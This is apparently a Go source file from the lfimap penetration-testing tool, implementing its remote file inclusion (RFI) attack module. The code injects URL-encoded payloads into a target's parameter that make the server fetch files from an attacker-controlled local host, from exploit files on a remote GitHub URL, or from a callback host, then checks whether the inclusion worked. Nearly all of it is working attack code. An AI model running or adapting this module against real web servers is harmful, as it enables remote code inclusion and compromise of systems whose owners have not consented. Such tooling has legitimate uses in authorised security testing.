package attacks

import (
	"fmt"
	"math/rand"
	"net/url"
	"time"

	lfihttp "github.com/hansmach1ne/lfimap/internal/http"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// RFIAttack implements Remote File Inclusion attack
type RFIAttack struct{}

// Name returns the attack name
func (a *RFIAttack) Name() string {
	return "rfi"
}

// Test executes the RFI attack
func (a *RFIAttack) Test(ctx *AttackContext, targetURL, postData string) bool {
	if ctx.Verbose {
		fmt.Printf("%s Testing remote file inclusion...\n", ctx.Colors.Blue("[i]"))
	}

	placeholder := ctx.Config.Args.Placeholder
	headers := lfihttp.HeadersToMap(lfihttp.InitHeaders(
		ctx.Config.Args.UserAgent,
		ctx.Config.Args.Referer,
		ctx.Config.Args.Cookie,
	))

	// Local RFI test with lhost
	if ctx.Config.Args.LHost != "" {
		port := ctx.Config.RFITestPort
		lhost := ctx.Config.Args.LHost

		// Note: HTTP server should be started by the scanner before calling this
		tests := []string{
			fmt.Sprintf("http%%3A%%2F%%2F%s%%3A%d%%2Fysvznc", lhost, port),
			fmt.Sprintf("http%%3A%%2F%%2F%s%%3A%d%%2Fysvznc%%00", lhost, port),
			fmt.Sprintf("http%%3A%%2F%%2F%s%%3A%d%%2Fysvznc.gif", lhost, port),
			fmt.Sprintf("http%%3A%%2F%%2F%s%%3A%d%%2Fysvznc.png", lhost, port),
			fmt.Sprintf("http%%3A%%2F%%2F%s%%3A%d%%2Fysvznc.jsp", lhost, port),
			fmt.Sprintf("http%%3A%%2F%%2F%s%%3A%d%%2Fysvznc.html", lhost, port),
			fmt.Sprintf("http%%3A%%2F%%2F%s%%3A%d%%2Fysvznc.php", lhost, port),
		}

		for _, test := range tests {
			u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, test, targetURL, postData, headers, ctx.Encodings)
			result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "RFI", "RFI", false, false, false)

			if !result.DoContinue {
				return true
			}

			if ctx.Quick {
				return false
			}
		}
	}

	// Internet RFI test
	baseURI := "https://raw.githubusercontent.com/hansmach1ne/LFImap/main/lfimap/src/exploits/"
	extensions := []string{".php", ".jsp", ".html", ".gif", ".png"}

	for _, ext := range extensions {
		payload := url.QueryEscape(baseURI + "ysvznc" + ext)
		u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, payload, targetURL, postData, headers, ctx.Encodings)
		result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "RFI", "RFI", false, false, false)

		if !result.DoContinue {
			return true
		}

		if ctx.Quick {
			return false
		}
	}

	// Callback RFI test
	if ctx.Config.Args.Callback != "" {
		randomNum := rand.Intn(90000) + 10000 // 5-digit random number
		callbackPayload := url.QueryEscape(fmt.Sprintf("http://%s/%d", ctx.Config.Args.Callback, randomNum))

		u, reqHeaders, postTest := lfihttp.PrepareRequest(placeholder, callbackPayload, targetURL, postData, headers, ctx.Encodings)
		result := lfihttp.Request(ctx.HTTPCtx, u, reqHeaders, postTest, "RFI", "RFI", false, false, false)

		if !result.DoContinue {
			return true
		}
	}

	return false
}

// randomNDigits generates a random n-digit number
func randomNDigits(n int) int {
	if n <= 0 {
		return 0
	}
	min := 1
	for i := 1; i < n; i++ {
		min *= 10
	}
	max := min * 10
	return rand.Intn(max-min) + min
}
